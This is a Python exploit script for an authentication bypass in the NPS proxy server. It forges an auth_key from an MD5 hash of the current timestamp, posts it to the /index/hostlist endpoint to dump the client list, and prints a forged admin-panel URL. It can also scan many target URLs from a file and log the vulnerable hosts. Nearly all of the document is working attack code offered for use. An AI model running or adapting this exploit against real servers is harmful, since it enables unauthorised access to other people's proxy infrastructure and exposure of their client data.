#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
@File    :   nps-auth-bypass.py
@Time    :   2022/07/28 14:18:32
@Author  :   _0xf4n9x_
@Version :   1.0
@Contact :   fanq.xu@gmail.com
@Desc    :   NPS Proxy Server Auth Bypass Vuln
"""


import os
import sys
import time
import hashlib
import argparse
import requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def proxy():
    proxy = None
    # proxy = {
    #     'http': 'http://127.0.0.1:8080',
    #     'https': 'http://127.0.0.1:8080',}
    return proxy

def gen_authkey(time=int(time.time())):
    mdf = hashlib.md5()
    mdf.update(str(time).encode("utf8"))
    auth_key = mdf.hexdigest()
    return auth_key

def poc(rooturl):
    headers = {"Content-Type": "application/x-www-form-urlencoded", 
               "X-Requested-With": "XMLHttpRequest", 
               "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"}
    now = int(time.time())
    payload = "search=&order=asc&offset=0&limit=10&auth_key=" + gen_authkey(now) + "&timestamp=" + str(now) + "&offset=0&limit=10&search="
    try:
        res = requests.post(rooturl+'/index/hostlist', headers=headers, data=payload, proxies=proxy(), timeout=15, verify=False)
        if (res.status_code == 200) and ('"rows":' in res.text and 'total":' in res.text):
            print("[+] {} is vulnerable!!!".format(rooturl))
            print("[+] Client List: ", res.text)
            return True
        else:
            print("[-] {} is not vulnerable.".format(rooturl))
            return False, ""
    except Exception as e:
        print("[-] {} Exception: ".format(rooturl) + e)
        pass
    return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="NPS Proxy Server Auth Bypass Vulnerability Scanner")
    parser.add_argument('-u', '--url', type=str,
                        help="vulnerability verification for individual websites")
    parser.add_argument('-f', '--file', type=str,
                        help="perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file")
    args = parser.parse_args()

    if len(sys.argv) == 3:
        if sys.argv[1] in ['-u', '--url']:
            rooturl = requests.utils.urlparse(args.url).scheme + "://" + requests.utils.urlparse(args.url).netloc
            if poc(rooturl) == True:
                now = int(time.time())
                uri = "/Index/Index?auth_key=%s&timestamp=%s" % (gen_authkey(now) , now)
                print("[+] Please Open This URL: {}{} ".format(rooturl,uri))
            else:
                sys.exit(0)
        elif sys.argv[1] in ['-f', '--file']:
            if os.path.isfile(args.file) == True:
                with open(args.file) as target:
                    urls = []
                    urls = target.read().splitlines()
                    for url in urls:
                        rooturl = requests.utils.urlparse(url).scheme + "://" + requests.utils.urlparse(url).netloc
                        if poc(rooturl) == True:
                            with open("success.txt", "a+") as f:
                                f.write(url + "\n")
    else:
        parser.print_help()
